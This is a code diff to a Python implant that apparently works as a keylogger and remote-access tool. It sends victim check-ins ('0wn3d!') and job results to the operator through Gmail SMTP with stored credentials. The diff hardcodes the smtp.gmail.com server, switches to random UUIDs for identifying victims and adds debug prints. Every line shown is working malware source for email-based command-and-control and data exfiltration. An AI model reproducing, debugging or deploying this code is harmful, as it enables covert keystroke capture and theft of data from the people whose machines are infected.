@@ -44,7 +44,8 @@ if verbose is True:
 logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 
 #generates a unique uuid 
-uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
+#uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode()))) 
+uniqueid = str(uuid.uuid4())
 print("Uniqueid: " + uniqueid)
 WH_KEYBOARD_LL=13                                                                 
 WM_KEYDOWN=0x0100
@@ -507,16 +508,17 @@ class sendEmail(threading.Thread):
         self.text = text
         self.jobid = jobid
         self.attachment = attachment
-        self.checkin = checkin
+        self.checkin = checkin 
         self.daemon = True
         self.start()
 
     def run(self):
+        print('Sending email')
         sub_header = uniqueid
         if self.jobid:
             sub_header = 'imp:{}:{}'.format(uniqueid, self.jobid)
         elif self.checkin:
-            sub_header = 'checkin:{}'.format(uniqueid)
+            sub_header = 'checkin:{}'.format(uniqueid) #subject header line regex 
 
         msg = MIMEMultipart()
         msg['From'] = sub_header
@@ -536,14 +538,22 @@ class sendEmail(threading.Thread):
 
         while True:
             try:
-                mailServer = SMTP()
+                print("Making mail server")
+                mailServer = SMTP('smtp.gmail.com', 587)
+                print("Mail server made")
                 mailServer.connect(server, server_port)
+                print("Mail server connected")
                 mailServer.starttls()
+                print("Mail server started")
                 mailServer.login(gmail_user,gmail_pwd)
+                print("Mail server logged in")
                 mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
+                print("Mail server sent")
                 mailServer.quit()
+                print("Mail server quit")
                 break
             except Exception as e:
+                print("Error: {}".format(e))
                 #if verbose == True: print_exc()
                 time.sleep(10)
 
@@ -615,8 +625,8 @@ def checkJobs():
 if __name__ == '__main__':
     print("Running implant exe")
     sendEmail("0wn3d!", checkin=True)
+    print("Email Sent")
     try:
         checkJobs()
     except KeyboardInterrupt:
         pass
-
